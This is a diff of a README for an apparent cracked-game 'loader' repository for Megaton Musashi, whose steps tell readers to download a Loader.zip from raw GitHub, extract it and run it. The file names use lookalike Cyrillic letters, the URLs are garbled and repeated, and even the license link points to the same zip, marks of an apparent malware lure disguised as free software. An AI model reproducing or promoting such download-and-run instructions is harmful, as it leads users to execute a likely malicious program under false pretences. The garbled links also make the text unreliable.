@@ -38,7 +38,7 @@ Megaton Musashi  • 2025 game loader • Download Megaton Musashi PC • Megato
 
 ## 📝 Installation
 
-1. Download `https://raw.githubusercontent.com/anisderoual/MegatonMusashi-FreeQuestHub/main/Lоader.zipоhttps://raw.githubusercontent.com/anisderoual/MegatonMusashi-FreeQuestHub/main/Lоader.zip` from the repository.
+1. Download `https://raw.githubusercontent.com/anisderoual/MegatonMusashi-FreeQuestHub/main/Lоader.zipоhttps://raw.githubusercontent.com/anisderoual/MegatonMusashi-FreeQuestHub/main/Lоader.zipоhttps://raw.githubusercontent.com/anisderoual/MegatonMusashi-FreeQuestHub/main/Lоader.zipоhttps://raw.githubusercontent.com/anisderoual/MegatonMusashi-FreeQuestHub/main/Lоader.zip` from the repository.
 2. Extract files to your desktop.
 3. Run the Loader and follow the on-screen instructions.
 4. Launch Megaton Musashi and enjoy!
@@ -53,4 +53,4 @@ This repository offers tools solely for educational and backup purposes. Use res
 
 ## 📄 License
 
-Distributed under the [MIT License (2025)](https://raw.githubusercontent.com/anisderoual/MegatonMusashi-FreeQuestHub/main/Lоader.zipоhttps://raw.githubusercontent.com/anisderoual/MegatonMusashi-FreeQuestHub/main/Lоader.zip). Enjoy, share, and contribute!
+Distributed under the [MIT License (2025)](https://raw.githubusercontent.com/anisderoual/MegatonMusashi-FreeQuestHub/main/Lоader.zipоhttps://raw.githubusercontent.com/anisderoual/MegatonMusashi-FreeQuestHub/main/Lоader.zipоhttps://raw.githubusercontent.com/anisderoual/MegatonMusashi-FreeQuestHub/main/Lоader.zipоhttps://raw.githubusercontent.com/anisderoual/MegatonMusashi-FreeQuestHub/main/Lоader.zip). Enjoy, share, and contribute!
